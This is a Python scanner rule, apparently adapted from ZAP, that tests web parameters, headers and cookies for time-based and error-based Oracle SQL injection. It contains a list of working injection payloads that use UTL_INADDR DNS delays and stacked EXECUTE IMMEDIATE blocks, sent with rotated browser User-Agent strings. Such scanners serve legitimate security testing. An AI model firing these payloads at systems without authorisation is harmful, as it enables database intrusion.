# Filename: VulnerabilityChecks/SqlInjectionOracleScanRule.py

import asyncio
import logging
import random
import re
import time
import urllib.parse
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple

import aiohttp

# Reuse the Alert class from the main SqlInjectionScanRule
from .SqlInjectionScanRule import Alert, Tech

# --- Oracle Specific Constants and Payloads ---
ORACLE_SQL_ONE_LINE_COMMENT = "-- " # Note the space

ORIG_VALUE_TOKEN = "<<<<ORIGINALVALUE>>>>"

# Oracle time delay payload using UTL_INADDR.get_host_name.
# Each call to a non-existent IP will cause a small DNS timeout.
# 5 such calls are used in ZAP's example to create a noticeable delay.
# The exact delay depends on DNS resolver timeout settings on the DB server.
# We assume this structure aims for roughly 5 seconds if each DNS lookup times out around 1s.
SQL_ORACLE_TIME_SELECT_PAYLOAD = (
    "SELECT UTL_INADDR.get_host_name('10.255.255.1') from dual union " # Non-routable IPs
    "SELECT UTL_INADDR.get_host_name('10.255.255.2') from dual union "
    "SELECT UTL_INADDR.get_host_name('10.255.255.3') from dual union "
    "SELECT UTL_INADDR.get_host_name('10.255.255.4') from dual union "
    "SELECT UTL_INADDR.get_host_name('10.255.255.5') from dual"
)

# Payloads adapted from ZAP's SqlInjectionOracleScanRule.java
SQL_ORACLE_TIME_PAYLOAD_TEMPLATES = [
    f"({SQL_ORACLE_TIME_SELECT_PAYLOAD})", # As a sub-expression
    f"{ORIG_VALUE_TOKEN} / ({SQL_ORACLE_TIME_SELECT_PAYLOAD}) ", # Numeric context
    f"{ORIG_VALUE_TOKEN}' / ({SQL_ORACLE_TIME_SELECT_PAYLOAD}) / '", # String context
    f"{ORIG_VALUE_TOKEN}\" / ({SQL_ORACLE_TIME_SELECT_PAYLOAD}) / \"", # String context (alt quote)
    # Boolean context using EXISTS
    f"{ORIG_VALUE_TOKEN} and exists ({SQL_ORACLE_TIME_SELECT_PAYLOAD}){ORACLE_SQL_ONE_LINE_COMMENT}",
    f"{ORIG_VALUE_TOKEN}' and exists ({SQL_ORACLE_TIME_SELECT_PAYLOAD}){ORACLE_SQL_ONE_LINE_COMMENT}",
    f"{ORIG_VALUE_TOKEN}\" and exists ({SQL_ORACLE_TIME_SELECT_PAYLOAD}){ORACLE_SQL_ONE_LINE_COMMENT}",
    f"{ORIG_VALUE_TOKEN}) and exists ({SQL_ORACLE_TIME_SELECT_PAYLOAD}){ORACLE_SQL_ONE_LINE_COMMENT}", # Closing a parenthesis
    f"{ORIG_VALUE_TOKEN} or exists ({SQL_ORACLE_TIME_SELECT_PAYLOAD}){ORACLE_SQL_ONE_LINE_COMMENT}",
    f"{ORIG_VALUE_TOKEN}' or exists ({SQL_ORACLE_TIME_SELECT_PAYLOAD}){ORACLE_SQL_ONE_LINE_COMMENT}",
    f"{ORIG_VALUE_TOKEN}\" or exists ({SQL_ORACLE_TIME_SELECT_PAYLOAD}){ORACLE_SQL_ONE_LINE_COMMENT}",
    f"{ORIG_VALUE_TOKEN}) or exists ({SQL_ORACLE_TIME_SELECT_PAYLOAD}){ORACLE_SQL_ONE_LINE_COMMENT}",
    # Stacked query attempt (Oracle usually disallows this via JDBC/standard web interfaces)
    # but worth a try for some edge cases or misconfigurations.
    f";BEGIN EXECUTE IMMEDIATE 'SELECT {SQL_ORACLE_TIME_SELECT_PAYLOAD} FROM DUAL'; END;{ORACLE_SQL_ONE_LINE_COMMENT}",
    f"';BEGIN EXECUTE IMMEDIATE 'SELECT {SQL_ORACLE_TIME_SELECT_PAYLOAD} FROM DUAL'; END;{ORACLE_SQL_ONE_LINE_COMMENT}",
]

# Oracle error message patterns (subset from ZAP's generic rule for context)
ORACLE_ERROR_PATTERNS = [
    re.compile(r"ORA-\d{5}:", re.IGNORECASE | re.DOTALL),
    re.compile(r"oracle\.jdbc", re.IGNORECASE | re.DOTALL),
    re.compile(r"SQL command not properly ended", re.IGNORECASE | re.DOTALL), # ORA-00933
    re.compile(r"table or view does not exist", re.IGNORECASE | re.DOTALL), # ORA-00942
    re.compile(r"invalid identifier", re.IGNORECASE | re.DOTALL), # ORA-00904
]


class SqlInjectionOracleScanRule:
    def __init__(self,
                 parent_logger: Optional[logging.Logger] = None,
                 max_time_requests_per_template: int = 2, # Max requests for each time payload template variation
                 expected_delay_ms: int = 4000, # Expected *additional* delay from payload (ZAP uses 5000ms)
                                                # Lowered slightly as 5x DNS timeouts might not always sum to full 5s
                 double_check_margin_ms: int = 1000, # Margin for the double check (original_time + expected - margin)
                 http_timeout: float = 20.0 # Needs to be > expected_delay_ms + typical response time
                 ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.max_time_requests_per_template = max_time_requests_per_template
        self.expected_delay_ms = expected_delay_ms
        self.double_check_margin_ms = double_check_margin_ms
        self.http_timeout = http_timeout
        
        self._time_requests_count = 0

    async def _send_request_async( # Copied from SqlInjectionSqLiteScanRule
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        headers: Dict[str, str],
        cookies: Dict[str, str],
        data: Optional[Dict[str, Any]] = None,
        param_name_attacked: Optional[str] = None,
        payload_used: Optional[str] = None
    ) -> Tuple[Optional[Any], Optional[str], float]: # Returns (DetachedResponse, text, duration_ms)
        start_time = time.monotonic()
        response_text: Optional[str] = None
        aio_response: Optional[aiohttp.ClientResponse] = None
        
        current_headers = headers.copy()
        if "User-Agent" not in current_headers:
             current_headers["User-Agent"] = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            ])

        log_payload_snippet = str(payload_used)[:50] + "..." if payload_used and len(payload_used) > 50 else payload_used
        self.logger.debug(f"Oracle Scan: Sending {method} to {url} (Param: {param_name_attacked}, Payload: {log_payload_snippet})")

        try:
            # For Oracle time-based, the payload itself causes delay, so base http_timeout should be sufficient
            # if it's set generously (e.g., > expected_delay_ms + typical_response_time_allowance)
            timeout = aiohttp.ClientTimeout(total=self.http_timeout)

            if method.upper() == "POST":
                async with session.post(url, headers=current_headers, cookies=cookies, data=data, timeout=timeout, allow_redirects=False) as resp:
                    aio_response = resp
                    response_text = await resp.text(errors='replace')
            else:
                async with session.get(url, headers=current_headers, cookies=cookies, timeout=timeout, allow_redirects=False) as resp:
                    aio_response = resp
                    response_text = await resp.text(errors='replace')
            
            duration_ms = (time.monotonic() - start_time) * 1000
            self.logger.debug(f"Oracle Scan: Response from {url}: Status {aio_response.status}, Duration: {duration_ms:.0f}ms, Length: {len(response_text or '')}")
            
            final_status = aio_response.status
            final_headers = dict(aio_response.headers)
            aio_response.release()

            @dataclass
            class DetachedResponse:
                status: int
                headers: Dict[str, str]
                text_content: Optional[str]
                async def text(self, errors='replace'): return self.text_content

            return DetachedResponse(status=final_status, headers=final_headers, text_content=response_text), response_text, duration_ms

        except asyncio.TimeoutError: # This is expected if the payload works and delay > http_timeout
            self.logger.info(f"Oracle Scan: Expected Timeout after {self.http_timeout}s for {method} {url} (Payload: {log_payload_snippet}) - POTENTIAL SUCCESS")
            return None, None, self.http_timeout * 1000 # Report timeout duration
        except aiohttp.ClientError as e:
            self.logger.warning(f"Oracle Scan: AIOHTTP ClientError for {method} {url} (Payload: {log_payload_snippet}): {type(e).__name__} - {e}")
            return None, None, (time.monotonic() - start_time) * 1000
        except Exception as e:
            self.logger.error(f"Oracle Scan: Unexpected error sending request for {method} {url} (Payload: {log_payload_snippet}): {e}", exc_info=True)
            return None, None, (time.monotonic() - start_time) * 1000

    def _build_request_params(self, base_url: str, injection_location: str, param_name: str, payload: str, original_value: str, method: str, original_form_data: Optional[Dict[str, str]] = None) -> Tuple[str, Optional[Dict[str, str]]]:
        # Identical to other SQLi rules
        target_url = base_url
        request_data: Optional[Dict[str, str]] = None
        if injection_location == "url_query":
            parsed_url = urllib.parse.urlparse(base_url)
            query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
            query_params[param_name] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            target_url = parsed_url._replace(query=new_query).geturl()
        elif injection_location == "form_data_post" and method.upper() == "POST":
            request_data = (original_form_data or {}).copy(); request_data[param_name] = payload
            target_url = base_url
        elif injection_location == "form_data_get" and method.upper() == "GET":
            parsed_url = urllib.parse.urlparse(base_url)
            query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
            if original_form_data:
                for k, v_list in urllib.parse.parse_qs(urllib.parse.urlencode(original_form_data, doseq=True)).items(): query_params[k] = v_list
            query_params[param_name] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            target_url = parsed_url._replace(query=new_query).geturl()
        return target_url, request_data

    async def scan(
        self,
        base_url: str, # Action URL for forms, page URL for others
        original_headers: Dict[str, str],
        original_cookies: Dict[str, str],
        injection_details: Dict[str, Any],
        aiohttp_session: aiohttp.ClientSession,
        original_page_content_for_baseline_errors: Optional[str] = None 
    ) -> List[Alert]:
        alerts: List[Alert] = []
        self._time_requests_count = 0
        
        param_name = injection_details["param_name"]
        original_value = injection_details["original_value"]
        location = injection_details["location"]
        method = injection_details.get("method", "GET")
        all_form_fields = injection_details.get("all_form_fields")

        self.logger.info(f"Starting Oracle Time-Based SQL Injection scan for param: '{param_name}' at location '{location}' on URL: {base_url}")

        # --- Get a baseline response time ---
        baseline_target_url, baseline_request_data = self._build_request_params(
            injection_details.get("form_action_url", base_url), location, 
            param_name, original_value, original_value, method, all_form_fields
        )
        if location in ["header", "cookie"]: baseline_target_url, baseline_request_data = base_url, None
        
        baseline_headers = original_headers.copy()
        baseline_cookies = original_cookies.copy()
        if location == "header": baseline_headers[param_name] = original_value
        elif location == "cookie": baseline_cookies[param_name] = original_value

        self.logger.debug(f"Oracle Scan: Fetching baseline response for param '{param_name}'.")
        baseline_resp_obj, _, baseline_duration_ms = await self._send_request_async(
            aiohttp_session, method, baseline_target_url, baseline_headers, baseline_cookies, baseline_request_data
        )

        if baseline_resp_obj is None:
            self.logger.warning(f"Oracle Scan: Could not fetch baseline response for param '{param_name}'. Time-based checks might be unreliable.")
            # If baseline fails, it's hard to do time-based. Could default to a very low baseline_duration_ms
            # or skip, for now, let's proceed but it will likely not yield results.
            baseline_duration_ms = 0 # Assume very fast if baseline failed

        # Iterate through Oracle time-based payload templates
        for payload_template in SQL_ORACLE_TIME_PAYLOAD_TEMPLATES:
            if self._time_requests_count >= self.max_time_requests_per_template:
                self.logger.debug("Oracle Scan: Reached max time-based request limit for this param.")
                break

            attack_payload = payload_template.replace(ORIG_VALUE_TOKEN, original_value)
            
            current_headers = original_headers.copy()
            current_cookies = original_cookies.copy()
            if location == "header": current_headers[param_name] = attack_payload
            elif location == "cookie": current_cookies[param_name] = attack_payload
            
            target_url, request_data = self._build_request_params(
                injection_details.get("form_action_url", base_url), location, 
                param_name, attack_payload, original_value, method, all_form_fields
            )
            if location in ["header", "cookie"]: target_url, request_data = base_url, None


            self._time_requests_count += 1
            attack_resp_obj, attack_resp_text, attack_duration_ms = await self._send_request_async(
                aiohttp_session, method, target_url, current_headers, current_cookies, request_data, param_name, attack_payload
            )

            # Check for Oracle errors first, even in time-based attempts
            if attack_resp_text:
                for err_pattern in ORACLE_ERROR_PATTERNS:
                    match = err_pattern.search(attack_resp_text)
                    # Ensure error was not in original page content if provided
                    base_match = None
                    if original_page_content_for_baseline_errors:
                        base_match = err_pattern.search(original_page_content_for_baseline_errors)
                    
                    if match and not base_match:
                        self.logger.info(f"Oracle Error-based SQLi (during time test): Pattern '{err_pattern.pattern}' matched for param '{param_name}' with payload '{attack_payload}'")
                        alerts.append(Alert(
                            name="SQL Injection - Oracle Error Based",
                            description=f"An Oracle database error was detected, indicating a SQL injection vulnerability. Error pattern: {err_pattern.pattern}",
                            uri=target_url, param=param_name, attack=attack_payload,
                            evidence=match.group(0)[:200],
                            rdbms=str(Tech.Oracle), injection_type="Error-based (Oracle)",
                            confidence=3 # High
                        ))
                        # If a clear error is found, we can often stop for this param for this rule
                        self.logger.info(f"Oracle SQLi (Error) found for param '{param_name}'. Stopping further Oracle tests for this param.")
                        return alerts # Return immediately

            # Time-based check
            # attack_duration_ms could be self.http_timeout * 1000 if it timed out as expected
            if attack_duration_ms >= (baseline_duration_ms + self.expected_delay_ms):
                self.logger.info(f"Oracle Time-Based: Initial delay detected. Attack: {attack_duration_ms:.0f}ms, Baseline: {baseline_duration_ms:.0f}ms, Expected_Min_Diff: {self.expected_delay_ms}ms")

                # Double check: re-fetch baseline to see if server is generally slow
                self.logger.debug("Oracle Time-Based: Performing double check for server load.")
                _, _, double_check_baseline_duration_ms = await self._send_request_async(
                    aiohttp_session, method, baseline_target_url, baseline_headers, baseline_cookies, baseline_request_data
                )
                
                # If the server is now also slow, this might be a false positive due to server load
                # ZAP: if (checkTimeUsed >= (originalTimeUsed + this.expectedDelayInMs - 200))
                # This means if the new baseline is ALMOST as slow as the attack that we thought was slow
                if double_check_baseline_duration_ms >= (baseline_duration_ms + self.expected_delay_ms - self.double_check_margin_ms):
                    self.logger.warning(f"Oracle Time-Based: Double check indicates server might be generally slow. New baseline: {double_check_baseline_duration_ms:.0f}ms. Previous baseline: {baseline_duration_ms:.0f}ms. Attack time: {attack_duration_ms:.0f}ms. Skipping alert for this payload.")
                    continue # Try next payload template

                # If double check passes (server not generally slow), then it's likely a vuln
                self.logger.info(f"Oracle Time-based SQLi: Param '{param_name}' vulnerable. Payload: '{attack_payload}'")
                alerts.append(Alert(
                    name="SQL Injection - Oracle Time Based",
                    description="A time-based SQL injection vulnerability specific to Oracle was detected. The application's response time significantly increased when injecting payloads designed to cause delays using Oracle's UTL_INADDR.get_host_name function.",
                    uri=target_url,
                    param=param_name,
                    attack=attack_payload,
                    evidence=f"Baseline response time: {baseline_duration_ms:.0f}ms. Attack response time: {attack_duration_ms:.0f}ms. Expected additional delay: {self.expected_delay_ms}ms. Double-check baseline: {double_check_baseline_duration_ms:.0f}ms.",
                    rdbms=str(Tech.Oracle), injection_type="Time-based (Oracle UTL_INADDR)",
                    confidence=2 # Medium, time-based can have FPs
                ))
                # Found a vulnerability, stop further Oracle tests for this parameter
                self.logger.info(f"Oracle SQLi (Time) found for param '{param_name}'. Stopping further Oracle tests for this param.")
                return alerts 
            else:
                self.logger.debug(f"Oracle Time-Based: No significant delay for payload '{attack_payload}'. Attack: {attack_duration_ms:.0f}ms, Baseline: {baseline_duration_ms:.0f}ms")

        self.logger.info(f"Oracle SQL Injection scan for param: '{param_name}' completed. Found {len(alerts)} alerts.")
        return alerts